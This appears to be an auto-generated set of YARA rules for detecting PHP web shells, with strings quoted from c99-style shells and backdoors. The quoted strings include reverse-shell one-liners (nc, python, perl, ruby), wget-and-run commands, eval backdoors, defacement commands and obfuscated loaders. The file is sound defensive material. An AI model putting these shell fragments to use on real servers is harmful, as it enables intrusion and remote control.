      $s17 = "rmwumWC+snJIn1hxQ2tCiyY5Pgj2yPTGaoUpKPdy8mtK4//iOodF5Cmb/Cs7i7du/fqr7fmifgCCM/7af/c6rcY+lFlpsgyojAJo8tz30nRtAbc377vLjAwaZz+mJA3u" ascii
      $s18 = "fZJwtJBvuvzEpjy87BTc///exTQa9PK0o4AJBgdeyalbGM7UnqOz0cUx8fC0qm0fxfgMPWDdvU2C2IWTU/7+nQ2oMUxbeR+O6dqDVq1ylyItBwE7OAAFfu6J+zEfD81u" ascii
      $s19 = "lGl1qOz8REIPWQ25yj/KAx7Y7WWzHeEhAZCLGxR9Gl9vArzG5VOtVrwLS/To/PfcQ9kFR/uYHkKH/ot6Enov7dj7KmIBOQ2ONTfPDAf+OeNxmp+ICn8QWNcYoEV9zjjc" ascii
      $s20 = "AD/Dod3v1bmzTjBcP4YKi5jgUHTD6yI850KdbiUbO4CoGPAIc0rKxGcvcpWeTAYmTb4GmPX2l5uHQ8ZKFrX27NN9B8xmmAQsDe773+gi1ox4c2K79QL38AM8QmUjOxae" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 70KB and
      8 of them
}

rule php17_2_1php
{
   meta:
      description = "php17 - file 2_1php.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e181422d122c229872f98db4334b9fd76e5ef498418746a458371cf1ef0017d5"
   strings:
      $s1 = "<form name=form1 action=exploit.php method=post>" fullword ascii
      $s2 = "<meta http-equiv=Content-Type content=text/html; charset=iso-8859-1>" fullword ascii
      $s3 = "<input name=go type=submit value=Send onClick=javascript:this.style.visibility ='hidden';>" fullword ascii
      $s4 = "C Contact : the_gl4di4t0r[AT]hotmail[DOT]com</title>" fullword ascii
      $s5 = "@$filename = stripslashes($_POST['filename']);" fullword ascii
      $s6 = "$fp = @fopen({$_POST['filename']}, 'a');" fullword ascii
      $s7 = "@$mess = stripslashes($_POST['mess']);" fullword ascii
      $s8 = "<title>Changing CHMOD Permissions Exploit " fullword ascii
      $s9 = "<textarea name=mess rows=3></textarea></font></b></textarea>" fullword ascii
      $s10 = "@fputs($fp,$mess <hr size=1 color=black>);" fullword ascii
      $s11 = "<input type=reset name=Submit value=Delete>" fullword ascii
      $s12 = "/index.php></p>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      8 of them
}

rule AlphaDashWithSpaces
{
   meta:
      description = "php17 - file AlphaDashWithSpaces.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "12d70055a6b0f389b7190a380a44647f11a092ae7423cb0efa062c925bcb6002"
   strings:
      $s1 = "* Get the validation error message." fullword ascii
      $s2 = "* Determine if the validation rule passes." fullword ascii
      $s3 = "* @param  string $attribute" fullword ascii
      $s4 = "return 'The :attribute may only contain letters, numbers, dashes and spaces.';" fullword ascii
      $s5 = "public function passes($attribute, $value)" fullword ascii
      $s6 = "return preg_match('/^[\\pL\\pM\\pN_\\s-]+$/u', $value) > 0;" fullword ascii
      $s7 = "if (! is_string($value) && ! is_numeric($value)) {" fullword ascii
      $s8 = "use Illuminate\\Contracts\\Validation\\Rule;" fullword ascii
      $s9 = "namespace Modules\\Media\\Validators;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule AddTopicItem
{
   meta:
      description = "php17 - file AddTopicItem.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9308666d1421b6107455a060ec15ae4f31f32c252dd11afddcd455ed99a56da8"
   strings:
      $s1 = "return \\URL::to('/ccm/system/dialogs/tree/node/add/topic?treeNodeID=' . $this->category->getTreeNodeID());" fullword ascii
      $s2 = "public function getDialogTitle()" fullword ascii
      $s3 = "namespace Concrete\\Core\\Tree\\Menu\\Item\\Topic;" fullword ascii
      $s4 = "public function getActionURL()" fullword ascii
      $s5 = "public function getItemName()" fullword ascii
      $s6 = "public function getAction()" fullword ascii
      $s7 = "use Concrete\\Core\\Tree\\Menu\\Item\\Category\\CategoryItem;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule ApacheTest
{
   meta:
      description = "php17 - file ApacheTest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "100723ff25f91f8c5c4b2e2c81fa889a2b5792735495cea0091913bc15767793"
   strings:
      $s1 = "$request = new HTTP\\Request('GET', '/');" fullword ascii
      $s2 = "$this->assertInstanceOf('Sabre\\DAV\\Auth\\Backend\\Apache', $backend);" fullword ascii
      $s3 = "function testRedirectRemoteUser() {" fullword ascii
      $s4 = "'REDIRECT_REMOTE_USER' => 'username'," fullword ascii
      $s5 = "function testRemoteUser() {" fullword ascii
      $s6 = "$response->getHeader('WWW-Authenticate')" fullword ascii
      $s7 = "$request = HTTP\\Sapi::createFromServerArray([" fullword ascii
      $s8 = "function testNoHeader() {" fullword ascii
      $s9 = "'REQUEST_METHOD' => 'GET'," fullword ascii
      $s10 = "$response = new HTTP\\Response();" fullword ascii
      $s11 = "namespace Sabre\\DAV\\Auth\\Backend;" fullword ascii
      $s12 = "function testRequireAuth() {" fullword ascii
      $s13 = "[true, 'principals/username']," fullword ascii
      $s14 = "$backend->challenge($request, $response);" fullword ascii
      $s15 = "class ApacheTest extends \\PHPUnit_Framework_TestCase {" fullword ascii
      $s16 = "use Sabre\\HTTP;" fullword ascii
      $s17 = "$backend->check($request, $response)" fullword ascii
      $s18 = "$backend->check($request, $response)[0]" fullword ascii
      $s19 = "'REMOTE_USER'    => 'username'," fullword ascii
      $s20 = "'REQUEST_METHOD'       => 'GET'," fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 5KB and
      8 of them
}

rule sig_0ad2f7781ab19960034d2ff2b4560ee9c8d1dcc5
{
   meta:
      description = "php17 - file 0ad2f7781ab19960034d2ff2b4560ee9c8d1dcc5.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "86884a87cfd1d31faabc0755a108a4cf0619f2ca73b41e982828fdfb732d0c75"
   strings:
      $s1 = "<?php @assert(\"\\$arr=\\\"\".$_GET['cmd'].\"\\\";\");?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_626c5c9305cee457e10b85c81af262c5bc437255
{
   meta:
      description = "php17 - file 626c5c9305cee457e10b85c81af262c5bc437255.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "bbe0f7278041cb3a6338844aa12c3df6b700a12a78b0a58bce3dce14f1c37b96"
   strings:
      $x1 = "RKS.COM/\\\">x2300 Shell</a>: Access Denied - your host (\".getenv(\"REMOTE_ADDR\").\") not allow\");}" fullword ascii
      $x2 = "if (!preg_match($s,getenv(\"REMOTE_ADDR\")) and !preg_match($s,gethostbyaddr(getenv(\"REMOTE_ADDR\")))) {exit(\"<a href=\\\"http" ascii
      $x3 = "?><html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1251\"><meta http-equiv=\"Content-Language" ascii
      $x4 = "myshellexec(\"lynx -dump $adires > sayko_bind;chmod 777 sayko_bind;./sayko_bind\");" fullword ascii
      $x5 = "function c999ftpbrutecheck($host,$port,$timeout,$login,$pass,$sh,$fqb_onlywithsh)" fullword ascii
      $x6 = "myshellexec(\"wget $adires -O sayko_bind;chmod 777 sayko_bind;./sayko_bind\");" fullword ascii
      $x7 = "echo \"<b>Your ip: <a href=http://whois.domaintools.com/\".$_SERVER[\"REMOTE_ADDR\"].\">\".$_SERVER[\"REMOTE_ADDR\"].\"</a> - Se" ascii
      $x8 = "iv=\\'refresh\\' content=\\'5\\\\;url=http\\:\\/\\/ALTURKS.COM\\'>/g' index.*\">index.* Mass Defacement" fullword ascii
      $x9 = "<OPTION VALUE=\"wget http://twofaced.org/linux2-6-all.c\">Linux Kernel 2.6.* rootkit.c" fullword ascii
      $x10 = "*  -Execute Mig-Log Logcleaner                           " fullword ascii
      $x11 = "if ($act == \"about\") {echo \"<center><b>Credits:<br>Idea, leading and coding by tristram[CCTeaM].<br>Beta-testing and some tip" ascii
      $x12 = "$accessdeniedmess = \"<a href=\\\"http://ALTURKS.COM\\\">x2300 Locus7Shell v.\".$shver.\"</a>: access denied\";" fullword ascii
      $x13 = "<OPTION VALUE=\"sed -i -e 's/<html>/<div style=\\'position\\:absolute\\;width\\:2000px\\;height\\:2000px\\;background-color\\:bl" ascii
      $x14 = "echo(\"<center><b>Bind Shell Backdoor:</b></br></br><form name=form method=POST>" fullword ascii
      $x15 = "$logfile = $tmpdir_logs.\"c999sh_ftpquickbrute_\".date(\"d.m.Y_H_i_s\").\".log\";" fullword ascii
      $x16 = "<OPTION VALUE=\"wget http://precision-gaming.com/sudo.c\">wget Linux sudo stack overflow" fullword ascii
      $x17 = "$fqb_log = \"FTP Quick Brute (called c999shell v. \".$shver.\") started at \".date(\"d.m.Y H:i:s\").\"\\r\\n\\r\\n\";" fullword ascii
      $s18 = "$c999sh_updateurl = \"http://ALTURKS.COM/files/lshell_update/\"; //Update server" fullword ascii
      $s19 = "$out = \"# Dumped by Locous7Shell.SQL v. \".$shver.\"" fullword ascii
      $s20 = "<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" b" ascii
   condition:
      uint16(0) == 0x733c and filesize < 700KB and
      1 of ($x*) and all of them
}

rule AjaxGatekeeper
{
   meta:
      description = "php17 - file AjaxGatekeeper.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "52ac838ccbeb307a556f17439f24a80db4c67c3106baca44610166ecb023d653"
   strings:
      $s1 = "* Protects a route from non-xhr requests" fullword ascii
      $s2 = "* @throws HttpException" fullword ascii
      $s3 = "* @param Request $request Request" fullword ascii
      $s4 = "$request->elgg()->gatekeeper->assertXmlHttpRequest();" fullword ascii
      $s5 = "* Gatekeeper" fullword ascii
      $s6 = "use Elgg\\HttpException;" fullword ascii
      $s7 = "public function __invoke(Request $request) {" fullword ascii
      $s8 = "namespace Elgg\\Router\\Middleware;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_5fcd5044168b365b8b9dd6beaab31287a2117492
{
   meta:
      description = "php17 - file 5fcd5044168b365b8b9dd6beaab31287a2117492.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "de88437636b6e80c9e5d6d490ee5d497d954654b588180d60a31ebcd30224a2c"
   strings:
      $x1 = "back Shell, use: <i>nc -e cmd.exe [SERVER] 3333<br>" fullword ascii
      $x2 = "<p align=\"center\"><font face=\"Verdana\" size=\"2\">[ Command Execute ]</font></td>" fullword ascii
      $s3 = "</i>after local command: <i>nc -v -l -p 3333 </i>(Windows)</font><br /><br /> <td><p align=\"center\"><br>" fullword ascii
      $s4 = "2006 by <a style=\"text-decoration: none\" target=\"_blank\" href=\"http://www.SR-Crew.de.tt\">SR-Crew</a> </font></td>" fullword ascii
      $s5 = "<textarea readonly size=\"1\" rows=\"7\" cols=\"53\"><?php @$output = system($_POST['command']); ?></textarea><br>" fullword ascii
      $s6 = "/*    0.3.2          666            coded a new uploader" fullword ascii
      $s7 = "$filecontents = stripslashes(html_entity_decode($_POST[\"contents\"]));" fullword ascii
      $s8 = "<br><input type=\"submit\" value=\"Execute!\"><br>" fullword ascii
      $s9 = "<p align=\"center\"><font face=\"Verdana\" size=\"2\">Rootshell v<?php echo \"$version\" ?>  " fullword ascii
      $s10 = "$status = \"<font face='Verdana' style='font-size: 8pt'>Error or No contents in file</font>\";" fullword ascii
      $s11 = "<font face=\"Verdana\" style=\"font-size: 8pt\">Insert your commands here:</font><br>" fullword ascii
      $s12 = "$filecontents = htmlentities(file_get_contents($filename));" fullword ascii
      $s13 = "<textarea name=\"contents\" cols=\"53\" rows=\"8\"><?echo $filecontents;?></textarea></font><br>" fullword ascii
      $s14 = "echo '<a target=\"blank\" href='.$file.'>'.$file.'</a><br>';" fullword ascii
      $s15 = "<textarea size=\"70\" name=\"command\" rows=\"2\" cols=\"40\" ></textarea> <br>" fullword ascii
      $s16 = "<p align=\"center\"><font face=\"Verdana\" size=\"2\">[ File Upload ]</font></td>" fullword ascii
      $s17 = "<font face=\"Verdana\" style=\"font-size: 8pt\"><b>Current Directory:</b> <? echo $_SERVER['DOCUMENT_ROOT']; ?>" fullword ascii
      $s18 = "/*  ummQHMM9C!.uQo.??WMMMMNNQQkI!!?wqQQQQHMMMYC!.umx.?7WMNHmmmo */" fullword ascii
      $s19 = "//    - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - " fullword ascii
      $s20 = "<form method=\"post\" action=\"<?echo $scriptname;?>\">" fullword ascii
   condition:
      uint16(0) == 0x3c0a and filesize < 40KB and
      1 of ($x*) and 4 of them
}

rule AttributePanelContext
{
   meta:
      description = "php17 - file AttributePanelContext.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "1b210c70cf2561c0849979f56e22a3b207f875d79cf662946c2ec18d2ace5d89"
   strings:
      $s1 = "namespace Concrete\\Core\\Attribute\\Context;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}


rule AddonCategory
{
   meta:
      description = "php17 - file AddonCategory.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c96a69daf4837246b894565656cb7a2c005a6a4ad1b405a8ae73f634b3d16f15"
   strings:
      $s1 = "* This is the model class for table \"{{%addon_category}}\"." fullword ascii
      $s2 = "* @return ActiveDataProvider" fullword ascii
      $s3 = "ActiveRecordHelper::getCommonTag(AddonCategory::className())," fullword ascii
      $s4 = "ActiveRecordHelper::getCommonTag(Addon::className())," fullword ascii
      $s5 = "* @property integer $id" fullword ascii
      $s6 = "/** @var $query \\yii\\db\\ActiveQuery */" fullword ascii
      $s7 = "* Search tasks" fullword ascii
      $s8 = "$addons = Yii::$app->cache->get($cacheKey);" fullword ascii
      $s9 = "use devgroup\\TagDependencyHelper\\ActiveRecordHelper;" fullword ascii
      $s10 = "$query->andFilterWhere(['like', 'name', $this->name]);" fullword ascii
      $s11 = "$query->andFilterWhere(['id' => $this->id]);" fullword ascii
      $s12 = "public static function availableAddons($id)" fullword ascii
      $s13 = "'sort_order' => Yii::t('app', 'Sort order')," fullword ascii
      $s14 = "public function attributeLabels()" fullword ascii
      $s15 = "use yii\\data\\ActiveDataProvider;" fullword ascii
      $s16 = "$dataProvider = new ActiveDataProvider(" fullword ascii
      $s17 = "namespace app\\modules\\shop\\models;" fullword ascii
      $s18 = "public static function tableName()" fullword ascii
      $s19 = "'name' => Yii::t('app', 'Name')," fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 7KB and
      8 of them
}

rule sig_2017_09_20_144631_add_folders_columns_on_files_table
{
   meta:
      description = "php17 - file 2017_09_20_144631_add_folders_columns_on_files_table.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d732924660fa24ff63b4450e77eede32532f52251056a30923860f4cda8a4ad9"
   strings:
      $s1 = "Schema::table('media__files', function (Blueprint $table) {" fullword ascii
      $s2 = "$table->boolean('is_folder')->default(false)->after('id');" fullword ascii
      $s3 = "$table->string('mimetype')->nullable()->change();" fullword ascii
      $s4 = "$table->string('filesize')->nullable(false)->change();" fullword ascii
      $s5 = "$table->string('mimetype')->nullable(false)->change();" fullword ascii
      $s6 = "$table->string('filesize')->nullable()->change();" fullword ascii
      $s7 = "$table->string('folder_id')->nullable()->change();" fullword ascii
      $s8 = "$table->string('folder_id')->nullable(false)->change();" fullword ascii
      $s9 = "$table->dropColumn('is_folder');" fullword ascii
      $s10 = "$table->string('extension')->nullable()->change();" fullword ascii
      $s11 = "$table->string('path')->nullable(false)->change();" fullword ascii
      $s12 = "$table->string('extension')->nullable(false)->change();" fullword ascii
      $s13 = "$table->string('path')->nullable()->change();" fullword ascii
      $s14 = "use Illuminate\\Support\\Facades\\Schema;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule sig_27f39fe03b8a845d353c707efc8e2766
{
   meta:
      description = "php17 - file 27f39fe03b8a845d353c707efc8e2766.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "779752359badcd612a27b14adc73a179a406ba6927876ed1ff32e7c347d1bb60"
   strings:
      $x1 = "$c=search(\"perl\",$failflag).' '.$exec_path.' '.$_POST[\"ip\"].' '.$_POST[\"port\"].' && rm -f '.$exec_path.'';" fullword ascii
      $x2 = "$c=search(\"python\",$failflag).' '.$exec_path.' -r '.$_POST[\"port\"].' '.$_POST[\"ip\"].' && rm -f '.$exec_path.'';" fullword ascii
      $x3 = "echo \"first save and compile findsock binary, then connect to this shell via nc and specify the path to binary in the request, " ascii
      $x4 = "$c='python -c \\'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"'.$_POST['ip']." fullword ascii
      $x5 = "$c='ruby -rsocket -e \\'exit if fork;c=TCPSocket.new(\"'.$_POST['ip'].'\",\"'.$_POST['port'].'\");while(cmd=c.gets);IO.popen(cm" fullword ascii
      $x6 = "$c=search(\"python\",$failflag).' '.$exec_path.' -b '.$_POST[\"port\"].' && rm -f '.$exec_path.'';" fullword ascii
      $x7 = "echo '<form method=\"post\" action=\"'.$_SERVER['PHP_SELF'].'\"><font color=\"gray\"> host: <input name=\"ssh2host\" type=\"text" ascii
      $x8 = "echo '<form method=\"post\" action=\"'.$_SERVER['PHP_SELF'].'\"> <font color=\"gray\">host: <input name=\"ssh2host\" type=\"text" ascii
      $x9 = "$c='perl -MIO -e \\'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"'.$_POST['ip'].':'.$_POST['port'].'\");STDIN->fdop" fullword ascii
      $x10 = "$c='rm -f /tmp/.ncnd; mknod /tmp/.ncnd p && telnet '.$_POST['ip'].' '.$_POST['port'].' 0</tmp/.ncnd | /bin/sh 1>/tmp/.ncnd" fullword ascii
      $x11 = "$c='rm -f /tmp/.ncnd; mknod /tmp/.ncnd p && nc '.$_POST['ip'].' '.$_POST['port'].' 0</tmp/.ncnd | /bin/sh 1>/tmp/.ncnd 2>&" fullword ascii
      $x12 = "$c='rm -f /tmp/.ncnd; mknod /tmp/.ncnd p && nc '.$_POST['ip'].' '.$_POST['port'].' 0</tmp/.ncnd | /bin/sh 1>/tmp/.ncnd 2>&1';" fullword ascii
      $x13 = "you could get almost-interactive shell in bind/backconnect with help of these commands<br>" fullword ascii
      $x14 = "f you see \"TERM is not set\", run command: export TERM=linux<br>//thanks to ont.rif for interactive backconnect<br>';" fullword ascii
      $x15 = "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">'.$style.'</head><body><script type=\"text/javascript\">'" ascii
      $x16 = "// --------------------------------------------- shell end; file operations" fullword ascii
      $x17 = "pcntl_exec($_POST[\"inter\"],array(\"-c\",\"\".$_POST[\"command\"].\" \".$_POST[\"to\"].\" \".$_POST[\"pcfile\"]));" fullword ascii
      $x18 = "//determining if pcntl enabled is kinda tricky. debug: add if(dl('pcntl.so')) or check var_dump(get_extension_funcs('pcntl')) ?" fullword ascii
      $x19 = "//determining if pcntl enabled is kinda tricky. debug: add if(dl('pcntl.so')) or check var_dump(get_extension_funcs('pcntl'))" fullword ascii
      $x20 = "site! (it could result in error 500). <br>it is recommended to create new dir and place custom .htaccess and minishells there.<" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*)
}

rule ActionSuccessMessageSettings
{
   meta:
      description = "php17 - file ActionSuccessMessageSettings.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "273c3a9cd2ddcc54fac82baef49d2045012ec5b4a4e891470cec5489e9c429da"
   strings:
      $s1 = "'value' => __( 'Your form has been successfully submitted.', 'ninja-forms' )," fullword ascii
      $s2 = "<?php if ( ! defined( 'ABSPATH' ) ) exit;" fullword ascii
      $s3 = "'label' => __( 'Message', 'ninja-forms' )," fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_5dbfe20690701a1296723379fb0ea1da6773f96d
{
   meta:
      description = "php17 - file 5dbfe20690701a1296723379fb0ea1da6773f96d.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "82b643f7f6cceafed76288f95324d274e4db23b1ccccff442b25d1449f4d08d4"
   strings:
      $s1 = "6776666E286763736A38346466656871646A2A2464524F58565B2C7C302C5F292E" ascii
      $s2 = "(@$_=cve('6A767C687B77','39')).@$_(cve('6776666E286763736A38346466656871646A2A2464524F58565B2C7C302C5F292E','520'));" fullword ascii
      $s3 = "6A767C687B77" ascii
      $s4 = "function cve($str,$key)" fullword ascii
      $s5 = "$t=$t.chr(hexdec(substr($str, $i,2))-$p);" fullword ascii
      $s6 = "$t=$t.chr(hexdec(substr($str, $i,4)));" fullword ascii
      $s7 = "$k=(($i+2)/2)%strlen($key);" fullword ascii
      $s8 = "$p=substr($key, $k,1);" fullword ascii
      $s9 = "for($i=0; $i<strlen($str); $i=$i+2)" fullword ascii
      $s10 = "if(is_numeric(substr($str, $i,1)))" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}


rule sig_12bf2e21a1e712a85a4e80d60d80618da2694bd2
{
   meta:
      description = "php17 - file 12bf2e21a1e712a85a4e80d60d80618da2694bd2.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4a8fe3d2e6298d18a61fc8d28f0dd210ff20a8a1f1c8e4ec5d80cf618e897ac0"
   strings:
      $s1 = "$myurl='http://www.zjjv.com';//" fullword ascii
      $s2 = "3Ve+sKNHLuFtP/zpe//hhf/5u78oz+WUKhZyE3elrl4bY70xuT" fullword ascii
      $s3 = "QaOkHSwetBfjpSHLfdrSwGrITkAl4NeAYWB5ANEYeQOMCsMK1Q" fullword ascii
      $s4 = "RvL60vXjRv6pjwLzGPfe/LbsOcvl3fbNi92bSxv5Ztg8dLl5Kd" fullword ascii
      $s5 = "OpqdXVfCBZfjRPdni1iYFZOX/xBHlogZFnrjYJyhpjWvrkoKnc" fullword ascii
      $s6 = "4FMGIYk6p4Vbyu9+wAfTPpb+dfaQ79Hvwe/g4aPaCO/oj4mLL5" fullword ascii
      $s7 = "wIui+t/gBcsvHkJCFZcEQxxlRSugfVjXA/hIzkRjFRLogykm2S" fullword ascii
      $s8 = "oMM5VHOcvAi+ndbMaMqmfGEtsEXIgT7lrzsB1w4jQFfUHzZ65A" fullword ascii
      $s9 = "4NCJOhINHlxJp8Md5iWwGZPCYDlgGBuUJN6bDNhnsADlLve8Iq" fullword ascii
      $s10 = "0A5kXzBtazYaHXtkUgEtigSd1KbR00grmOksD1vRTL2g8sw3d8" fullword ascii
      $s11 = "V8wjiGcpu0JkBzps8H80MZDk8U5lkLdsx9JghqWvdjusPyJAi6" fullword ascii
      $s12 = "bu2JKD2QLRAR9aHrN30RGaGTNih34JBlPDAfVnLlOGMXA3tpNU" fullword ascii
      $s13 = "$password='admin';//" fullword ascii
      $s14 = "kEyQQIaCKTh4GfBa17bQLDFdpkPLcTDT0NsxeKGThRnWpUkmCU" fullword ascii
      $s15 = "rFEOVkarrI8w8POkqzzMtMpu/0LXZS9EruVfJMFKqj+I7GmGsG" fullword ascii
      $s16 = "bbpc4BGEWQrRBgnk+FEauyH0b1nvnoF1b+tport2aIApeA4++U" fullword ascii
      $s17 = "4CsAJ+jcHSQq4Wg2kpbfC2kEyXjgyQai5TMmLIxcNPgno8oHBb" fullword ascii
      $s18 = "B0FbaFtmPmmgZ3s0NQE9OPmTxojoHgUMvoygzi4dEg3KTPdObA" fullword ascii
      $s19 = "ravd5p89RCOmDLWa/acU1OBrRcXXK9oliP/pUsON3cWVWOPNKD" fullword ascii
      $s20 = "ndRUNyt2jJZynKtQxKCd2umkg5Eoj5ct3jk/rbQx4mt+j5omVf" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      8 of them
}

rule sig_5a42c89ac7b0e1b19603088b61aeed203e026fc3
{
   meta:
      description = "php17 - file 5a42c89ac7b0e1b19603088b61aeed203e026fc3.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "353f44323be3b6564790acced0c8cbe76aa864515b16c8f8de3571fb15044481"
   strings:
      $x1 = "<form action=\"<?php echo $surl; ?>\"><input type=\"hidden\" name=\"act\" value=\"sql\"><input type=\"hidden\" name=\"sql_act\" " ascii
      $x2 = "echo \"Result Of Locally Executed Command: <b>$execcmd</b></br>\";" fullword ascii
      $x3 = "echo(\"<b>Arka Kapi Girisi:</b></br></br><form name=form method=POST>Sunucu:<input type=text name=backconnectip size=15 value=$i" ascii
      $x4 = "$fqb_log = \"FTP Quick Brute (called c99shell v. \".$shver.\") started at \".date(\"d.m.Y H:i:s\").\"\\r\\n\\r\\n\";" fullword ascii
      $s5 = "$logfile = $tmpdir_logs.\"ftpquickbrute_\".date(\"d.m.Y_H_i_s\").\".log\";" fullword ascii
      $s6 = "# MySQL Versiyon: (\".mysql_get_server_info().\") running on \".getenv(\"SERVER_ADDR\").\" (\".getenv(\"SERVER_NAME\").\")\".\"" fullword ascii
      $s7 = "$_POST['proxyhostmsg']=\"</br></br><center><font color=red size=3><b>HATA!</b></font></br></br></br></br></center>\";" fullword ascii
      $s8 = "array(\"<b><font face='tahoma' size='1'>[&#304;&#351;l&#601;m&ccedil;i]</b>\",$surl.\"act=processes&d=%d\")," fullword ascii
      $s9 = "else {$y = \"<a href=\\\"\".$surl.\"act=\".$dspact.\"&d=\".urlencode($d).\"&processes_sort=\".$k.\"d\\\">[sort_asc]</a>\";}" fullword ascii
      $s10 = "if (file_get_contents(\"/var/cpanel/accounting.log\")) {echo \"<b><font color=green><a href=\\\"\".$surl.\"act=f&f=accounting.lo" ascii
      $s11 = "01;lumatsayarinizda <a href='http://www.g3n3t1x.by.ru/exploit/nc.exe'>nc.exe</a> ve acik bir port gerekir! Komutunuz; '<b>nc -l " ascii
      $s12 = "hbd $por\",$scan)){ $data = (\"\\n</br>Process not found running, backdoor not setup successfully.\"); }" fullword ascii
      $s13 = "<font face='Tahoma' size='1' color='#00FF00'>\".gethostbyname($_SERVER['HTTP_HOST']).\"</font></td>" fullword ascii
      $s14 = "if (!$fp) {echo \"<b>Indirme Hatas?! Bu dosya yazilabilir degil \\\"\".htmlspecialchars($sql_dump_file).\"\\\"!\";}" fullword ascii
      $s15 = "if ($fqb_logemail) {@mail($fqb_logemail,\"c99shell v. \".$shver.\" report\",$fqb_log);}" fullword ascii
      $s16 = "if (trim($cmd) == \"ps aux\") {$act = \"processes\";}" fullword ascii
      $s17 = "echo \"dump_\".getenv(\"SERVER_NAME\").\"_\".$sql_db.\"_\".date(\"d-m-Y-H-i-s\").\".sql\"; ?>\"><font face=\"Tahoma\">&nbsp;</fo" ascii
      $s18 = "<b>Grup&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: <?php if (!$win) " ascii
      $s19 = ".$k.\"][0] - unknown command.\"; c99shexit();}" fullword ascii
      $s20 = "echo \"<form action=\\\"\".$surl.\"\\\"><input type=hidden name=act value=\\\"ftpquickbrute\\\"><br>Read first: <input type=text" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 400KB and
      1 of ($x*) and 4 of them
}

rule sig_5325f7e0e00bc54bfbb5fcb774976611fef87ec1
{
   meta:
      description = "php17 - file 5325f7e0e00bc54bfbb5fcb774976611fef87ec1.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "406420acdb116041b2345ecb586b99bdbd2e27a8c8f15dd1741eef04e9b6f823"
   strings:
      $s1 = "if(file_put_contents('file.jpg', $post_data)){" fullword ascii
      $s2 = "$post_data = \"<?php\\r\\n\".$post_data.\"\\r\\n\".\"?>\";" fullword ascii
      $s3 = "$post_data = $ran__($post_data);" fullword ascii
      $s4 = "$post_data = $_POST['z0'];" fullword ascii
      $s5 = "$ch__=$ch_($int__[97]).$ch_($int__[115]).$ch_($int__[115]);" fullword ascii
      $s6 = "$ch___=$ch_($int__[101]).$ch_($int__[114]).$ch_($int__[116]);" fullword ascii
      $s7 = "//@$ass($_POST[kris]);" fullword ascii
      $s8 = "if($_POST['z0']) {" fullword ascii
      $s9 = "$ass(include('file.jpg'));" fullword ascii
      $s10 = "$ran__ = 'ba'.'se'.'64'.'_decode';" fullword ascii
   condition:
      uint16(0) == 0x4947 and filesize < 1KB and
      all of them
}

rule sig_9f7199b79919cc225704c2db2de9aa12a76fce0b
{
   meta:
      description = "php17 - file 9f7199b79919cc225704c2db2de9aa12a76fce0b.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "82f36cc515ebe11a2370b82089b60505e1446fb55bf58a5cf3f48c2010f050cc"
   strings:
      $s1 = "<?php ${'_'.$_}['_'](${'_'.$_}['__']);?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_2015_12_22_163507_create_service_types_table
{
   meta:
      description = "php17 - file 2015_12_22_163507_create_service_types_table.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "cc890b39da65919ac549e5f9e9b41a473beae519ba4c04fd9e6076500b7979f5"
   strings:
      $s1 = "Schema::create('service_types', function ($table) {" fullword ascii
      $s2 = "$table->foreign('business_id')->references('id')->on('businesses');" fullword ascii
      $s3 = "Schema::drop('service_types');" fullword ascii
      $s4 = "$table->string('description');" fullword ascii
      $s5 = "$table->integer('business_id')->unsigned();" fullword ascii
      $s6 = "$table->string('slug')->index();" fullword ascii
      $s7 = "class CreateServiceTypesTable extends Migration" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

